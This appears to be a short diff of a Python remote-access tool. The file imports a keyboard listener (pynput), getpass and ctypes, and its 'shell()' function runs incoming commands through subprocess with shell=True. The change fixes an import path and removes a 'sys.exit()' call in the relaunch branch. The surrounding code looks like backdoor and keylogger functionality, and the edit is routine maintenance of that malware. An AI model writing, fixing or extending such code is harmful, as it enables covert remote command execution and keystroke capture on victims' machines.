@@ -14,7 +14,7 @@ from requests import  get
 from webbrowser import  open as op
 import getpass
 import ctypes
-from Scripts.bottle import unicode
+from bottle import unicode
 from pynput.keyboard import Listener
 import time
 
@@ -950,7 +950,6 @@ def shell():
                     sys.exit()
                 else:
                     os.startfile(sys.executable)
-                    sys.exit()
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
